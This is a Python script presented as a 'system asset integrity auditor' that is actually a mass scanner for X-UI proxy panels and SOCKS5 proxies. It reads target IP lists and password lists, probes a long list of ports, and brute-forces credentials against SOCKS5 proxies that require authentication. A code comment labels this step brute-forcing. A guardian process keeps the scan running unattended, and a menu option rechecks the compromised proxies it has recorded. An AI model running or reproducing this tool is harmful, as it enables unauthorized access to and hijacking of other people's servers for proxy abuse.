import asyncio
import ipaddress
import random
import time
import sys
import os
import string
import json
import signal
import subprocess
import ctypes
import ssl
import re
from datetime import datetime

# ============================================================
#  SYSTEM ASSET INTEGRITY AUDITOR (SAIA) v20.0 - 双排深度审计版
# ============================================================

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
STATE_FILE = os.path.join(BASE_DIR, "sys_audit_state.json")
LOG_FILE = os.path.join(BASE_DIR, "sys_audit_events.log")
REPORT_FILE = os.path.join(BASE_DIR, "audit_report.log")
NODE_FILE = os.path.join(BASE_DIR, "nodes.list")
FALLBACK_NODE_FILE = os.path.join(BASE_DIR, "ip.txt")
FALLBACK_NODE_FILE_UPPER = os.path.join(BASE_DIR, "IP.TXT")
TOKEN_FILE = os.path.join(BASE_DIR, "tokens.list")
FALLBACK_TOKEN_FILE = os.path.join(BASE_DIR, "pass.txt")
GUARDIAN_STATE_FILE = os.path.join(BASE_DIR, "sys_guardian_state.json")
MAX_LOG_BYTES = 2 * 1024 * 1024
MAX_REPORT_BYTES = 8 * 1024 * 1024
LOG_BACKUPS = 5
REPORT_BACKUPS = 3
DEFAULT_XUI_PORTS = "54321,2053"
DEFAULT_S5_PORTS = (
    "1080-1090,1111,2222,3333,4444,5555,6666,7777,8888,9999,"
    "1234,4321,8000,9000,6868,6688,8866,9527,1472,2583,3694,10000-10010"
)
DEFAULT_MIXED_PORTS = f"{DEFAULT_XUI_PORTS},{DEFAULT_S5_PORTS}"

# 颜色配置
C_BOLD, C_W = "\033[1m", "\033[0m"
C_BLUE = "\033[38;5;33m"
C_PROC = "\033[38;5;42m"
C_SUCC = "\033[38;5;46m"
C_Y = "\033[38;5;226m"
C_DIM = "\033[2m"

# ==================== 工具函数 ====================

def now_ts(): return time.time()

async def close_writer(writer):
    if writer:
        try:
            writer.close()
            await asyncio.wait_for(writer.wait_closed(), timeout=1.0)
        except (OSError, asyncio.TimeoutError):
            pass

def save_state(path, state):
    try:
        with open(path + ".tmp", "w", encoding="utf-8") as f:
            json.dump(state, f, ensure_ascii=False, indent=2)
        os.replace(path + ".tmp", path)
    except OSError:
        pass

def load_state(path):
    if not os.path.exists(path):
        return {}
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except (OSError, json.JSONDecodeError):
        return {}


def rotate_file_if_needed(file_path, max_bytes, backup_count):
    try:
        if not os.path.exists(file_path):
            return
        if os.path.getsize(file_path) < max_bytes:
            return
        for i in range(backup_count, 0, -1):
            src = file_path if i == 1 else f"{file_path}.{i-1}"
            dst = f"{file_path}.{i}"
            if os.path.exists(src):
                if os.path.exists(dst):
                    os.remove(dst)
                os.replace(src, dst)
    except OSError:
        pass


def append_rotating(file_path, text, max_bytes, backup_count):
    rotate_file_if_needed(file_path, max_bytes, backup_count)
    try:
        with open(file_path, "a", encoding="utf-8") as f:
            f.write(text)
    except OSError:
        pass


def log_event(msg):
    stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    append_rotating(LOG_FILE, f"[{stamp}] {msg}\n", MAX_LOG_BYTES, LOG_BACKUPS)


def read_last_lines(path, lines=50):
    if not os.path.exists(path):
        return ""
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            return "".join(f.readlines()[-lines:])
    except OSError:
        return ""


def pick_one_verified_result():
    if not os.path.exists(REPORT_FILE):
        return None
    try:
        with open(REPORT_FILE, "r", encoding="utf-8", errors="replace") as f:
            rows = [line.strip() for line in f if line.strip()]
        verified_rows = [r for r in rows if "验证成功" in r]
        if not verified_rows:
            return None
        return random.choice(verified_rows)
    except OSError:
        return None


def mode_label(mode):
    return {1: "XUI专项", 2: "S5专项", 3: "深度全能"}.get(mode, str(mode))


def work_mode_label(work_mode):
    return {1: "探索", 2: "探索+验真", 3: "只验真"}.get(work_mode, str(work_mode))


def parse_report_targets(lines):
    targets = []
    seen = set()
    xui_pat = re.compile(r"Asset\[X-UI\]:\s*([^:\s]+):(\d+)")
    s5_open_pat = re.compile(r"Node\[S5-Open\]:\s*([^:\s]+):(\d+)")
    s5_auth_pat = re.compile(r"Node\[S5-Auth\]:\s*(?:[^@\s]+@)?([^:\s]+):(\d+)")

    for line in lines:
        text = line.strip()
        if not text:
            continue
        m = xui_pat.search(text)
        kind = "xui"
        if not m:
            m = s5_open_pat.search(text)
            kind = "s5"
        if not m:
            m = s5_auth_pat.search(text)
            kind = "s5"
        if not m:
            continue
        ip, port = m.group(1), int(m.group(2))
        key = (kind, ip, port)
        if key in seen:
            continue
        seen.add(key)
        targets.append(key)
    return targets


async def verify_s5_service(ip, port):
    writer = None
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=3.0)
        writer.write(b"\x05\x02\x00\x02")
        await writer.drain()
        res = await asyncio.wait_for(reader.read(2), timeout=2.0)
        if not res or res[0] != 5:
            return False, "SOCKS5握手失败"
        if res[1] == 0x00:
            return True, "SOCKS5开放代理仍可用"
        if res[1] == 0x02:
            return True, "SOCKS5认证代理仍可用"
        return True, f"SOCKS5返回认证方法: 0x{res[1]:02x}"
    except (asyncio.TimeoutError, OSError, ValueError):
        return False, "连接超时或不可达"
    finally:
        await close_writer(writer)


async def reverify_discovered_results():
    if not os.path.exists(REPORT_FILE):
        return "未找到报告文件，无法复验。"

    with open(REPORT_FILE, "r", encoding="utf-8", errors="replace") as f:
        lines = f.readlines()
    targets = parse_report_targets(lines)
    if not targets:
        return "报告中没有可复验目标。"

    passed, failed = 0, 0
    logs = []
    for kind, ip, port in targets:
        if kind == "xui":
            tmp_state = {"xui_found": 0, "xui_verified": 0}
            ok = bool(await audit_xui(ip, port, tmp_state, 3))
            msg = "XUI复验成功" if ok else "XUI复验失败"
        else:
            ok, detail = await verify_s5_service(ip, port)
            msg = detail if ok else f"S5复验失败: {detail}"

        if ok:
            passed += 1
        else:
            failed += 1
        logs.append(f"[{kind.upper()}] {ip}:{port} -> {msg}")

    stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    append_rotating(
        os.path.join(BASE_DIR, "reverify.log"),
        f"[{stamp}] total={len(targets)} passed={passed} failed={failed}\n" + "\n".join(logs) + "\n\n",
        512 * 1024,
        3,
    )
    return f"复验完成: 总计{len(targets)}，成功{passed}，失败{failed}（详情见 reverify.log）"


def render_progress_bar(done, total, width=28):
    if total <= 0:
        return "[" + ("-" * width) + "] 0.0%"
    ratio = max(0.0, min(1.0, done / total))
    fill = int(width * ratio)
    return "[" + ("#" * fill) + ("-" * (width - fill)) + f"] {ratio * 100:5.1f}%"


def resolve_node_file():
    if os.path.exists(FALLBACK_NODE_FILE_UPPER):
        return FALLBACK_NODE_FILE_UPPER
    if os.path.exists(NODE_FILE):
        return NODE_FILE
    if os.path.exists(FALLBACK_NODE_FILE):
        return FALLBACK_NODE_FILE
    return None


def resolve_token_file():
    if os.path.exists(TOKEN_FILE):
        return TOKEN_FILE
    if os.path.exists(FALLBACK_TOKEN_FILE):
        return FALLBACK_TOKEN_FILE
    return None

def is_alive(pid):
    if not pid or pid <= 0:
        return False
    try:
        os.kill(pid, 0)
        return True
    except OSError:
        return False

def parse_ports(raw):
    ports = []
    try:
        for p in raw.replace(" ", "").split(","):
            if not p:
                continue
            if "-" in p:
                s, e = map(int, p.split("-", 1))
                s, e = max(1, min(65535, s)), max(1, min(65535, e))
                ports.extend(range(min(s, e), max(s, e) + 1))
            else:
                pn = int(p)
                if 1 <= pn <= 65535:
                    ports.append(pn)
    except ValueError:
        return []
    return sorted(set(ports))


def prompt_int(msg, default, min_value=None, max_value=None):
    while True:
        raw = input(msg).strip()
        if not raw:
            value = default
        else:
            try:
                value = int(raw)
            except ValueError:
                print("输入无效，请输入整数。")
                continue
        if min_value is not None and value < min_value:
            print(f"输入过小，最小值为 {min_value}。")
            continue
        if max_value is not None and value > max_value:
            print(f"输入过大，最大值为 {max_value}。")
            continue
        return value


def prompt_float(msg, default, min_value=None):
    while True:
        raw = input(msg).strip()
        if not raw:
            value = default
        else:
            try:
                value = float(raw)
            except ValueError:
                print("输入无效，请输入数字。")
                continue
        if min_value is not None and value < min_value:
            print(f"输入过小，最小值为 {min_value}。")
            continue
        return value


def get_available_memory_mb():
    if os.name == "nt":
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [
                ("dwLength", ctypes.c_ulong),
                ("dwMemoryLoad", ctypes.c_ulong),
                ("ullTotalPhys", ctypes.c_ulonglong),
                ("ullAvailPhys", ctypes.c_ulonglong),
                ("ullTotalPageFile", ctypes.c_ulonglong),
                ("ullAvailPageFile", ctypes.c_ulonglong),
                ("ullTotalVirtual", ctypes.c_ulonglong),
                ("ullAvailVirtual", ctypes.c_ulonglong),
                ("sullAvailExtendedVirtual", ctypes.c_ulonglong),
            ]

        stat = MEMORYSTATUSEX()
        stat.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        if ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(stat)):
            return stat.ullAvailPhys / 1024 / 1024
        return None

    if sys.platform.startswith("freebsd"):
        try:
            page_size = int(subprocess.check_output(["sysctl", "-n", "hw.pagesize"], text=True).strip())
            free_pages = int(subprocess.check_output(["sysctl", "-n", "vm.stats.vm.v_free_count"], text=True).strip())
            inactive_pages = int(subprocess.check_output(["sysctl", "-n", "vm.stats.vm.v_inactive_count"], text=True).strip())
            cache_pages = int(subprocess.check_output(["sysctl", "-n", "vm.stats.vm.v_cache_count"], text=True).strip())
            return (page_size * (free_pages + inactive_pages + cache_pages)) / 1024 / 1024
        except (OSError, ValueError, subprocess.SubprocessError):
            return None

    meminfo = "/proc/meminfo"
    if os.path.exists(meminfo):
        try:
            with open(meminfo, "r", encoding="utf-8", errors="replace") as f:
                for line in f:
                    if line.startswith("MemAvailable:"):
                        parts = line.split()
                        if len(parts) >= 2:
                            return int(parts[1]) / 1024
        except OSError:
            return None
    return None


def run_guardian(mode, work_mode, threads, ports_str, feed_int=0.05, check_interval=20, min_free_mb=256.0):
    save_state(
        GUARDIAN_STATE_FILE,
        {
            "pid": os.getpid(),
            "status": "running",
            "mode": mode,
            "work_mode": work_mode,
            "threads": threads,
            "ports": ports_str,
            "updated_at": now_ts(),
            "min_free_mb": min_free_mb,
            "check_interval": check_interval,
            "feed_int": feed_int,
        },
    )
    log_event(
        f"Guardian started mode={mode} work_mode={work_mode} threads={threads} ports={ports_str} "
        f"feed_int={feed_int} check_interval={check_interval}s min_free_mb={min_free_mb}"
    )
    while True:
        st = load_state(STATE_FILE)
        if not is_alive(st.get("pid")):
            mem_mb = get_available_memory_mb()
            if mem_mb is None or mem_mb >= min_free_mb:
                subprocess.Popen(
                    [
                        sys.executable,
                        __file__,
                        "run",
                        str(mode),
                        str(work_mode),
                        str(threads),
                        ports_str,
                        str(feed_int),
                    ],
                    start_new_session=True,
                )
                log_event(
                    f"Guardian restarted audit process (free_mem={mem_mb:.0f}MB)"
                    if mem_mb is not None
                    else "Guardian restarted audit process"
                )
            else:
                log_event(f"Guardian wait: low memory {mem_mb:.0f}MB < {min_free_mb:.0f}MB")
        gs = load_state(GUARDIAN_STATE_FILE)
        gs["updated_at"] = now_ts()
        gs["last_free_mb"] = mem_mb if 'mem_mb' in locals() else get_available_memory_mb()
        save_state(GUARDIAN_STATE_FILE, gs)
        time.sleep(check_interval)

# ==================== 审计核心 (协议双向验证) ====================

async def audit_xui(ip, port, state, work_mode):
    """X-UI 探测与验证"""
    async def fetch_page(path, use_ssl=False):
        writer = None
        try:
            ssl_ctx = ssl.create_default_context() if use_ssl else None
            if ssl_ctx is not None:
                ssl_ctx.check_hostname = False
                ssl_ctx.verify_mode = ssl.CERT_NONE
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port, ssl=ssl_ctx if use_ssl else None),
                timeout=3.0,
            )
            req = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {ip}\r\n"
                "User-Agent: SAIA/20.0\r\n"
                "Connection: close\r\n\r\n"
            )
            writer.write(req.encode("utf-8", errors="ignore"))
            await writer.drain()
            return await asyncio.wait_for(reader.read(16384), timeout=4.0)
        except (asyncio.TimeoutError, OSError, ssl.SSLError):
            return b""
        finally:
            await close_writer(writer)

    def match_xui(data):
        if not data:
            return False
        low = data.lower()
        strong_markers = (b"x-ui", b"3x-ui", b"/xui")
        if any(m in low for m in strong_markers):
            return True
        if b"/login" in low and (b"username" in low or b"password" in low):
            return True
        if b"location:" in low and (b"/login" in low or b"/xui" in low):
            return True
        if b"http/1.1 200" in low and b"content-type: text/html" in low and b"<title>" in low and b"login" in low:
            return True
        return False

    probes = [
        ("/", False),
        ("/login", False),
        ("/xui", False),
        ("/", True),
        ("/login", True),
        ("/xui", True),
    ]

    for path, use_ssl in probes:
        data = await fetch_page(path, use_ssl=use_ssl)
        if match_xui(data):
            if work_mode in (1, 2):
                state["xui_found"] += 1
            if work_mode in (2, 3):
                state["xui_verified"] += 1
            proto = "https" if use_ssl else "http"
            if work_mode == 1:
                status = "发现成功-面板疑似在线"
            elif work_mode == 2:
                status = "探索+验真成功-面板在线"
            else:
                status = "仅验真成功-面板在线"
            return f"Asset[X-UI]: {ip}:{port} | 状态: {status} | 协议: {proto} | 路径: {path}"
    return None

async def audit_socks5(ip, port, tokens, state, work_mode):
    """SOCKS5 探测、验证与爆破"""
    writer = None
    try:
        r, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=3.0)
        writer.write(b"\x05\x02\x00\x02")
        await writer.drain()
        res = await asyncio.wait_for(r.read(2), timeout=2.0)
        if not res or res[0] != 5: return None

        # 无需认证的节点
        if res[1] == 0x00:
            if work_mode in (1, 2):
                state["s5_found"] += 1
            if work_mode == 1:
                return f"Node[S5-Open]: {ip}:{port} | 状态: 发现成功-开放代理"
            await close_writer(writer)
            r2, w2 = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=2.5)
            try:
                start = time.perf_counter()
                w2.write(b"\x05\x01\x00\x01\x01\x01\x01\x01\x00\x50")
                await w2.drain()
                ack = await asyncio.wait_for(r2.read(10), timeout=2.5)
                if ack and ack[1] == 0x00:
                    lat = int((time.perf_counter() - start) * 1000)
                    state["s5_verified"] += 1
                    label = "探索+验真成功" if work_mode == 2 else "仅验真成功"
                    return f"Node[S5-Open]: {ip}:{port} | {label}-RTT:{lat}ms"
            finally: await close_writer(w2)

        # 需要认证的节点 (执行爆破)
        if res[1] == 0x02 and tokens:
            if work_mode in (1, 2):
                state["s5_found"] += 1
            if work_mode == 1:
                return f"Node[S5-Auth]: {ip}:{port} | 状态: 发现成功-需认证"
            await close_writer(writer)
            for u, p in tokens:
                w3 = None
                try:
                    r3, w3 = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=2.0)
                    w3.write(b"\x05\x01\x02")
                    await w3.drain(); await r3.read(2)
                    w3.write(b"\x01" + bytes([len(u)]) + u.encode() + bytes([len(p)]) + p.encode())
                    await w3.drain()
                    auth = await asyncio.wait_for(r3.read(2), timeout=2.0)
                    if auth and auth[1] == 0x00:
                        state["s5_verified"] += 1
                        label = "探索+验真成功" if work_mode == 2 else "仅验真成功"
                        return f"Node[S5-Auth]: {u}@{ip}:{port} | {label}-认证通过"
                except (asyncio.TimeoutError, OSError, ValueError):
                    continue
                finally:
                    await close_writer(w3)
    except (asyncio.TimeoutError, OSError, ValueError):
        pass
    finally:
        await close_writer(writer)
    return None

# ==================== 后台调度 (双排数据采集) ====================

async def internal_audit_process(mode, work_mode, threads, ports, feed_int):
    state = {
        "status": "running", "pid": os.getpid(), 
        "total": 0, "done": 0, 
        "xui_found": 0, "xui_verified": 0, "s5_found": 0, "s5_verified": 0,
        "work_mode": work_mode,
        "recent": [], "started_at": now_ts(), "current": "Initializing..."
    }
    save_state(STATE_FILE, state)
    log_event(
        f"Audit started mode={mode} work_mode={work_mode} threads={threads} ports={len(ports)}"
    )
    
    tokens = []
    token_file = resolve_token_file()
    if token_file:
        log_event(f"Using token file: {os.path.basename(token_file)}")
        with open(token_file, "r", encoding="utf-8", errors="ignore") as f:
            for l in f:
                l = l.strip()
                if l: tokens.append(l.split(":", 1) if ":" in l else ["admin", l])
    else:
        log_event("Token file not found: tokens.list/pass.txt")

    q = asyncio.Queue(maxsize=threads*2)
    
    async def worker():
        while True:
            ip = await q.get()
            if ip is None:
                q.task_done()
                break
            try:
                state["current"] = f"Auditing -> {ip}"
                x_done = (mode == 2)
                s_done = (mode == 1)
                for p in ports:
                    found_res = []
                    # 模式 1/3：独立验证 X-UI
                    if mode in (1, 3) and not x_done:
                        x_r = await audit_xui(ip, p, state, work_mode)
                        if x_r:
                            found_res.append(x_r)
                            x_done = True

                    # 模式 2/3：独立验证 SOCKS5
                    if mode in (2, 3) and not s_done:
                        s_r = await audit_socks5(ip, p, tokens, state, work_mode)
                        if s_r:
                            found_res.append(s_r)
                            s_done = True
                    
                    if found_res:
                        for r in found_res:
                            state["recent"] = (state["recent"] + [r])[-6:]
                            append_rotating(
                                REPORT_FILE,
                                r + "\n",
                                MAX_REPORT_BYTES,
                                REPORT_BACKUPS,
                            )
                    if x_done and s_done:
                        break
                state["done"] += 1
                state["current"] = f"Completed -> {ip}"
                save_state(STATE_FILE, state)
            finally:
                q.task_done()

    workers = [asyncio.create_task(worker()) for _ in range(threads)]
    
    node_file = resolve_node_file()
    if not node_file:
        state["status"] = "completed"
        save_state(STATE_FILE, state)
        log_event("Audit aborted: nodes.list/ip.txt not found")
        return

    log_event(f"Using target file: {os.path.basename(node_file)}")

    try:
        with open(node_file, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line: continue
                state["current"] = f"Feeding target -> {line}"
                await q.put(line); state["total"] += 1; await asyncio.sleep(feed_int)
    except OSError:
        pass

    for _ in range(threads): await q.put(None)
    await asyncio.gather(*workers)
    state["status"] = "completed"; state["current"] = "Completed"; save_state(STATE_FILE, state)
    log_event(f"Audit completed done={state['done']} total={state['total']}")

# ==================== 管理界面 (双排显示) ====================

def main_console():
    while True:
        os.system("cls" if os.name == "nt" else "clear")
        print(f"{C_BLUE}SAIA v20.0 | 深度审计双排控制台{C_W}")
        s = load_state(STATE_FILE); g = load_state(GUARDIAN_STATE_FILE)
        print(f"进程: {'ON' if is_alive(s.get('pid')) else 'OFF'} | 守护: {'ON' if is_alive(g.get('pid')) else 'OFF'}")
        print("-" * 55)
        print("1) 启动审计 | 2) 进入双排监控 | 3) 查看审计结果 | 4) 查看系统日志")
        print("5) 终止审计 | 6) 启动守护 | 7) 抽取一条已验证结果 | 8) 停止守护 | 9) 退出")
        
        c = input("\n请选择指令: ").strip()
        if c == "1":
            print("\n1.XUI专项 | 2.S5专项 | 3.深度全能审计")
            m = prompt_int("模式 (1-3): ", default=3, min_value=1, max_value=3)
            print("子模式: 1.探索 | 2.探索+验真 | 3.只验真")
            wm = prompt_int("子模式 (1-3): ", default=2, min_value=1, max_value=3)
            th = prompt_int("线程 (默认20): ", default=20, min_value=1, max_value=500)
            fi = prompt_float("IP 调用间隔秒 (默认0.02): ", default=0.02, min_value=0.0)
            default_ports = (
                DEFAULT_XUI_PORTS if m == 1 else DEFAULT_S5_PORTS if m == 2 else DEFAULT_MIXED_PORTS
            )
            ps = input(f"端口 (默认 {default_ports}): ") or default_ports
            if not parse_ports(ps):
                print("端口格式无效。")
                time.sleep(1)
                continue
            subprocess.Popen(
                [sys.executable, __file__, "run", str(m), str(wm), str(th), ps, str(fi)],
                start_new_session=True,
            )
            print(f"审计已提交后台运行。模式: {mode_label(m)} | 子模式: {work_mode_label(wm)}")
            time.sleep(1)
        elif c == "2":
            try:
                while True:
                    st = load_state(STATE_FILE)
                    done = st.get('done', 0); total = st.get('total', 0)
                    bar = render_progress_bar(done, total)
                    os.system("cls" if os.name == "nt" else "clear")
                    print(f"{C_BLUE}SAIA v20.0 | 双排监控{C_W}")
                    print(f"工作状态: {st.get('current', '-')} | 子模式: {work_mode_label(st.get('work_mode', 2))}")
                    print(f"{C_PROC}[第一排 X-UI]{C_W} 发现面板: {st.get('xui_found', 0)} | 验证成功: {st.get('xui_verified', 0)}")
                    print(f"{C_SUCC}[第二排 SOCKS5]{C_W} 发现节点: {st.get('s5_found', 0)} | 验真成功: {st.get('s5_verified', 0)}")
                    print(f"{C_Y}[第三排 工作状态]{C_W} 进度: {bar} ({done}/{total}) | 状态: {st.get('status','-')}")
                    print("\nCtrl+C 返回菜单")
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n监控已关闭。")
                time.sleep(0.5)
        elif c == "3":
            output = read_last_lines(REPORT_FILE, lines=50)
            print(output if output else "暂无审计结果。")
            input("\n按回车返回...")
        elif c == "4":
            output = read_last_lines(LOG_FILE, lines=50)
            print(output if output else "暂无系统日志。")
            input("\n按回车返回...")
        elif c == "5":
            pid = load_state(STATE_FILE).get("pid")
            if is_alive(pid):
                os.kill(pid, signal.SIGTERM)
                print("审计任务已终止。")
                log_event(f"Audit stopped manually pid={pid}")
            else:
                print("当前没有运行中的审计任务。")
            time.sleep(1)
        elif c == "6":
            m = prompt_int("守护模式 (1-3): ", default=3, min_value=1, max_value=3)
            print("守护子模式: 1.探索 | 2.探索+验真 | 3.只验真")
            wm = prompt_int("守护子模式 (1-3): ", default=2, min_value=1, max_value=3)
            th = prompt_int("守护线程 (默认10): ", default=10, min_value=1, max_value=500)
            fi = prompt_float("守护启动时 IP 调用间隔秒 (默认0.05): ", default=0.05, min_value=0.0)
            ci = prompt_float("守护检查间隔秒 (默认20): ", default=20.0, min_value=1.0)
            mm = prompt_float("最低可用内存MB阈值 (默认256): ", default=256.0, min_value=32.0)
            default_ports = (
                DEFAULT_XUI_PORTS if m == 1 else DEFAULT_S5_PORTS if m == 2 else DEFAULT_MIXED_PORTS
            )
            ps = input(f"守护端口 (默认 {default_ports}): ") or default_ports
            if not parse_ports(ps):
                print("端口格式无效。")
                time.sleep(1)
                continue
            subprocess.Popen(
                [
                    sys.executable,
                    __file__,
                    "guardian",
                    str(m),
                    str(wm),
                    str(th),
                    ps,
                    str(fi),
                    str(ci),
                    str(mm),
                ],
                start_new_session=True,
            )
            print(f"守护已启动。模式: {mode_label(m)} | 子模式: {work_mode_label(wm)}")
            time.sleep(1)
        elif c == "7":
            print("正在一键复验已发现目标，请稍候...")
            result = asyncio.run(reverify_discovered_results())
            print(result)
            input("\n按回车返回...")
        elif c == "8":
            gpid = load_state(GUARDIAN_STATE_FILE).get("pid")
            if is_alive(gpid):
                os.kill(gpid, signal.SIGTERM)
                print("守护已停止。")
                log_event(f"Guardian stopped manually pid={gpid}")
            else:
                print("当前没有运行中的守护进程。")
            time.sleep(1)
        elif c == "9":
            break

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "run":
        if len(sys.argv) < 7:
            raise SystemExit("参数不足: run <mode> <work_mode> <threads> <ports> <feed_int>")
        mode = int(sys.argv[2])
        work_mode = int(sys.argv[3])
        threads = int(sys.argv[4])
        ports = parse_ports(sys.argv[5])
        feed_int = float(sys.argv[6])
        if mode not in (1, 2, 3):
            raise SystemExit("mode 仅支持 1/2/3")
        if work_mode not in (1, 2, 3):
            raise SystemExit("work_mode 仅支持 1/2/3")
        if threads < 1:
            raise SystemExit("threads 必须大于 0")
        if not ports:
            raise SystemExit("端口参数无效")
        if feed_int < 0:
            raise SystemExit("feed_int 不能小于 0")
        asyncio.run(internal_audit_process(mode, work_mode, threads, ports, feed_int))
    elif len(sys.argv) > 1 and sys.argv[1] == "guardian":
        if len(sys.argv) < 6:
            raise SystemExit("参数不足: guardian <mode> <work_mode> <threads> <ports> [feed_int] [check_interval] [min_free_mb]")
        feed_int = float(sys.argv[6]) if len(sys.argv) > 6 else 0.05
        check_interval = float(sys.argv[7]) if len(sys.argv) > 7 else 20.0
        min_free_mb = float(sys.argv[8]) if len(sys.argv) > 8 else 256.0
        if feed_int < 0:
            raise SystemExit("feed_int 不能小于 0")
        if check_interval < 1:
            raise SystemExit("check_interval 不能小于 1")
        if min_free_mb < 32:
            raise SystemExit("min_free_mb 不能小于 32")
        run_guardian(
            int(sys.argv[2]),
            int(sys.argv[3]),
            int(sys.argv[4]),
            sys.argv[5],
            feed_int=feed_int,
            check_interval=check_interval,
            min_free_mb=min_free_mb,
        )
    else:
        main_console()
